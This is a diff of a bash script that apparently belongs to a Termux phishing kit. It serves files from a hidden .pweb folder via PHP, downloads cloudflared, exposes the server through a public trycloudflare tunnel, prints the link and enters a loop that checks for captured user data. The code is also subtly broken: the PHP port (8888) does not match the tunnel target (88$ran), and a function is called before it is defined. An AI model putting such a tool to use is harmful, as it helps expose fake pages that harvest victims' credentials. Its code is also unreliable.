@@ -43,15 +43,75 @@ mov(){
     cp -R server/* .pweb > /dev/null 
 }
 mov
-# now make a function to start the localhost server
-l_server(){
-    echo -en "\033[36;1m Enter a port number: "
-    read port 
-    # now start the server 
-    php -S 127.0.0.1:$port -t .pweb > /dev/null 2>&1 & sleep 4
-    echo -e "\033[35;1m server started on http://127.0.0.1:$port"
+# now make a function to start localhost 
+localserver(){
+	 ran=$((RANDOM % 100))
+	 php -S 127.0.0.1:88$ran -t .pweb > /dev/null 2>&1 & sleep 4
+	 echo -e "\e[34;1m[~] Localhost started on http://127.0.0.1:88$ran"
 }
-l_server
+# now start the cloudflare
+start_cloud(){
+    # remove the previous log file
+    rm -rf .pk.txt > /dev/null 2>&1 
+    # now ask the url 
+	ran=$((RANDOM % 100))
+    echo -e "\e[34;1m [~] Starting php server : "
+    php -S 127.0.0.1:8888 -t .pweb > /dev/null 2>&1 & sleep 4
+    echo -e "\e[0;1m Starting clodflare.. "
+    #check fi it is termux or not ..$link
+    if [[ `command -v termux-chroot` ]];then
+    sleep 3 && termux-chroot ./cloudflare tunnel -url http://127.0.0.1:88$ran --logfile .pk.txt > /dev/null 2>&1 & #throw all the process in background .. 
+    else
+    sleep 3 && ./cloudflare tunnel -url http://127.0.0.1:88$ran --logfile .pk.txt > /dev/null 2>&1 & 
+    fi
+    # now extract the link from the logfile .. 
+    sleep 8
+    clear
+    banner
+    echo -ne "\e[36;1m Link: "
+    cat .pk.txt | grep "trycloudflare" | cut -d "|" -f2 | cut -d "}" -f2 
+	user_data
+}
+#make a function to download the cloudflared 
+download(){
+    wget --no-check-certificate $1 -O cloudflare
+    chmod +x cloudflare 
+}
+#first check the platform of the machine 
+check_platform(){
+if [[ -e cloudflare ]];then
+    echo -e "\e[36;1m[~] Cloudflared already installed ."
+else
+    echo -e "\e[32;1m Downloding coludflared"
+    host=$(uname -m)
+    if [[($host == "arm") || ($host == "Android")]];then
+    download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
+    elif [[ $host == "aarch64" ]];then
+    download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
+    elif [[ $host == "x86_64" ]];then
+    download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
+    else 
+    download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
+    fi
+fi
+}
+# now make a function to start the localhost server
+ask_server(){
+    echo -e "\033[36;1m [~] Choose the option: "
+	echo -e "\e[35;1m [01] Localhost (for devloper)"
+	echo -e "\e[35;1m [02] Cloudflare "
+    read port 
+	if [[( $port == "01") || ( $port == "1")]];then
+	localserver
+	elif [[( $port == "02") || ( $port == "2")]];then
+	check_platform
+	start_cloud
+	else 
+	echo -e "\e[31;1m[!] Invalid option: "
+	user_intrupt
+	fi
+}
+ask_server
 # make a function to check the data 
 user_data(){
    while true;do
